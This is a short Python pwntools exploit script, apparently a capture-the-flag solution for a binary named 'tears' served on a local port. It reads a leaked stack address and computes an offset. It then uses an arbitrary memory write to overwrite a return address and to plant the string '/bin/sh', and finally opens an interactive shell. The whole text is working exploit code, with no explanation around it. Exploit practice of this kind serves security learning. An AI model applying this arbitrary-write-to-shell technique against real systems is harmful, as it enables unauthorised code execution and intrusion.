from pwn import *
#context.log_level = 'debug'
#p = process('./tears')
p = remote('127.0.0.1', 2333)

#gdb.attach(p, 'b *0x080489b5')

def send(index, value):
	p.recvuntil('Eye  >')
	p.sendline(hex(index))
	p.recvuntil('Tear >')
	p.sendline(str(value))

def recv():
	p.recvuntil('Your relative:')
	luck = p.recvuntil('\n')
	return luck

luck = int(recv(), 16)
#print hex(luck)
local = 0xffffcfcc
diff = luck - local
#print hex(diff)


send(0xffffcffc + diff, 0x0804883c)   
#send(0xffffcffc, 0x0804883c)
#send(0xffffcffc, 0x0804883c)
send(0x080bb888, 0x6e69622f)  # 'nib/'
send(0x080bb88c, 0x2068732f)  # ' hs/'
#p.recv()
p.interactive()
